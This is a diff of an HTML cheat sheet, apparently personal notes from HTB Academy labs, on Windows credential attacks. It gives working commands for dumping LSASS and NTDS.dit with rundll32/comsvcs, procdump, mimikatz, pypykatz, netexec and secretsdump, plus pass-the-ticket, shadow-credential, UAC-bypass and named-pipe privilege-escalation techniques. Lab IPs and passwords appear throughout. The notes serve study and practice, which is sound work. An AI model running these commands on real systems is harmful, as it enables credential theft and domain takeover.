                     <ul>
                         <p>You can always export lsass from task manager but it is possible that you land in a host where you only have shell access. In order to extract it perform the following</p>
                         <p>First identify the PID of lsass</p>
-                        <p>CMD</p>
-                        <pre><code class="language-powershell">tasklist /svc</code></pre>
-                        <p>Powershell</p>
-                        <pre><code class="language-powershell">Get-Process lsass</code></pre>
+                        <pre><code class="language-powershell">tasklist /svc #CMD
+Get-Process lsass #Powershell=</code></pre>
                         <p>Now create a dump file</p>    
                         <pre><code class="language-powershell">rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID C:\lsass.dmp full</code></pre>
+                        <p>You can also do it with <b>procdump</b> from sysinternals</p>
+                        <pre><code class="language-powershell">procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre>
                         
                         <h3>Alternative ways to do it</h3>
                         <ul>
                             <p>You can automate this process with netexec</p>
                             <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
                             <p>Or by using a meterpreter shell with the kiwi module loaded</p>
+                             <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-powershell">meterpreter > load kiwi
+meterpreter > lsa_dump_sam</code></pre>    
+                                </div>  
+                        </ul>
+                        <p>In order to view it'ts content just do</p>
+                        <h3>Mimikatz</h3>
+                        <ul>
+                            <p>From mimikatz just perform</p>
+                            <pre><code class="language-powershell">.\mimikatz.exe
+sekurlsa::minidump lsass.DMP
+sekurlsa::logonpasswords</code></pre>
+                            <p>In case we would like to transfer mimikatz we can find it in our linux in <b>/usr/share/windows-resources/mimikatz/x64</b></p>    
+                        </ul>
+                        
+                        <h3>pypykatz</h3>
+                        <ul>
+                            <pre><code class="language-powershell">pypykatz lsa minidump file.dmp</code></pre>
+                            <p>In case it shows any format error it is because the way you extracted did not work. Try using procdump, or rundll32 . <b>Extracting through task manager normally fails</b></p>
                         </ul>    
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
                     <ul>
                         <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
@@ -254,11 +575,10 @@ User: SRV01\mcharles</code></pre>
 mimikatz # sekurlsa::credman  </code></pre>
                         <p><b>It is posible that you requiere to perform a relogin from the victim side</b></p>    
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Exporting NTDS.dit">Exporting NTDS.dit</h2>
                     <ul>
+                        <p>An alternative method can be found <a class="notion-link" href="#Copying_NTDS.dit">here</a></p>
                         <p>Create a volume shadow copy which is basically a windows mecanism to create snapshots of a disk volume while the system is in use</p>
                         <pre><code class="language-powershell">vssadmin CREATE SHADOW /For=C:</code></pre>
                         <p>In order to check where the NTDS.dit file is located we can use re query and look for the parameter <b>DSA Database file</b></p>
@@ -269,13 +589,11 @@ mimikatz # sekurlsa::credman  </code></pre>
                         <p>Transfer the file and crackit using </p>
                         <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL</code></pre>
                         <p>Crack the hash by using <b>-m 1000</b> in hashcat (NTLM)</p>
-                        <p>Other methods more easier</p>
+                        <b>Other easier methods</b>
                         <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
                     
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="MS09-012">MS09-012</h2>
                     <ul>
                         <p>RCE in the service spooler which will grant us a privielge scalation method. Checkout github repo<a class="notion-link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/README.md"> here</a></p>
@@ -284,17 +602,12 @@ mimikatz # sekurlsa::credman  </code></pre>
                         <p>In case you would like to retrive information about files...👀</p>
                         <pre><code class="language-powershell">pr.exe "more \"C:\\Documents and Settings\\Harry\\Desktop\\user.txt\""</code></pre>    
                     </ul>
-                </div>
 
-                <div class="notion-body">
                     <h2 id="Bypassing UAC">Bypassing UAC</h2>
                     <ul>
                         <p>In case you would like to escalate privileges and have access to windows UI you could start msconfig and then spawn a terminal by using the tools. This terminal will be an admin terminal</p>
                     </ul>
-                </div>
 
-
-                <div class="notion-body">
                     <h2 id="Pass the ticket">Pass the ticket</h2>
                     <ul>
                         <p>With the use of mimikatz or rubeus we are able to list all tickets and log in as another users just by using them here i show you how</p>
@@ -331,9 +644,7 @@ Enter-PSSession -ComputerName DC01</code></pre>
 
                         </ul>
                     </ul>
-                </div>
 
-                 <div class="notion-body">
                     <h2 id="Pass the certificate">Pass the certificate</h2>
                         <h3> Shadow Credentials (msDS-KeyCredentialLink) </h3>
                         <ul>
@@ -347,9 +658,29 @@ Enter-PSSession -ComputerName DC01</code></pre>
                             <p>Finally get the NTLM hash of the user using the AS-REP encrytion key found later</p>
                             <pre><code class="language-powershell">python3 getnthash.py -key 9bc7b2f5fa26ddbaa206c4dbcd367fced55f31a928c517741aced8d922924d76 INLANEFREIGHT.LOCAL/jpinkman</code></pre>
                         </ul>
-                </div>
 
-        </div>
+                    <h2 id="Named pipes Attack">Named pipes Attack</h2>
+                    <ul>    
+                        <p>Processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read</p>
+                        <p>We can list named pipes by using powershell Get-ChildItem</p>
+                        <pre><code class="language-powershell">gci \\.\pipe\</code></pre>
+                        <p>An example of named pipe is</p>
+                        <pre><code class="language-powershell">\\.\PipeName\\ExampleNamedPipeServer</code></pre>
+                        <p>We can list permissions of named pipes by using <b>Accesschk</b> from sysinternals. This way we will figure out who has permissions to write, read or execute a resource</p>
+                        <p>For example there is a privesc vulnerability in windscribe software since it's pipe can be controlled by any user</p>
+                        <pre><code class="language-powershell">accesschk.exe -accepteula -w \pipe\WindscribeService -v
+#Output                            
+\\.\Pipe\WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        FILE_ALL_ACCESS
+                        </code></pre>
+                    </ul>
+                
+                    
+                    
+                </div>
+          </div>
     </div>
 </body>
 
@@ -369,6 +700,16 @@ Enter-PSSession -ComputerName DC01</code></pre>
             sidebarList.appendChild(listItem);
         });
     }
+
+    const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
 
     // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
     window.addEventListener('load', generateMenu);
